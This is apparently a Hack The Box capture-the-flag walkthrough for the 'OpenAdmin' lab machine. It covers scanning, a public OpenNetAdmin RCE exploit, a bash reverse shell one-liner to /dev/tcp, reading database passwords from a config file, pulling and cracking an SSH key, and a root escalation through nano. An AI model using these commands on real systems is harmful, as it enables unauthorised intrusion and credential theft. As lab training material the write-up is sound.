---
title: OpenAdmin
layout: post
author: Bit Criminals Team
date: 2021-07-27 17:02:00 +0530
type: Pentesting
difficulty: Medium
prompt: https://app.hackthebox.eu/machine/OpenAdmin
---

## STEP_1 ==> NMAP SCAN

![](/images/whitefang/OpenAdmin_nmap.png) 


## STEP_2 ==> GOBUSTER

![](/images/whitefang/OpenAdmin_gobuster.png) 

  
## STEP_3 ==> OPEN /music

>http://10.10.10.171/music

![](/images/whitefang/OpenAdmin_music.png) 

![](/images/whitefang/OpenAdmin_ona.png) 


## STEP_4 ==> SEARCHING THE EXPLOIT

![](/images/whitefang/OpenAdmin_searchsploit.png)

>https://github.com/amriunix/ona-rce


 ## STEP_5 ==> GETTING SHELL

```bash
python3 ona-rce.py check http://10.10.10.171/ona/
```

![](/images/whitefang/OpenAdmin_revshell.png)

Sending reverse shell on our IP:
```bash
/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
```
![](/images/whitefang/OpenAdmin_listen.png)


## STEP_6 ==> GETTING USER PASSWORD

Opening /var/www/html/ona/local/config//database_settings.inc.php

![](/images/whitefang/OpenAdmin_password.png)

Trying same password to ssh login on user - jimmy


## STEP_7 ==> GETTING RSA KEY

Opening  /var/www/internal/main.php

![](/images/whitefang/OpenAdmin_jimmy.png)

Getting RSA key

```bash
curl http://127.0.0.1:52846/main.php
```
![](/images/whitefang/OpenAdmin_rsa.png)


## STEP_8 ==> CRACKING RSA KEY

![](/images/whitefang/OpenAdmin_rsacrack.png)


## STEP_9 ==> SSH LOGIN (joanna)

![](/images/whitefang/OpenAdmin_vulroot.png)


## STEP_10 ==> ROOT
  
we can access /bin/nano as root without password.
we can open the /opt/priv file using the nano to escalate to the user to root.
```bash
reset; sh 1>&0 2>&0
```
  
![](/images/whitefang/OpenAdmin_nano.png)

![](/images/whitefang/OpenAdmin_flag.png)
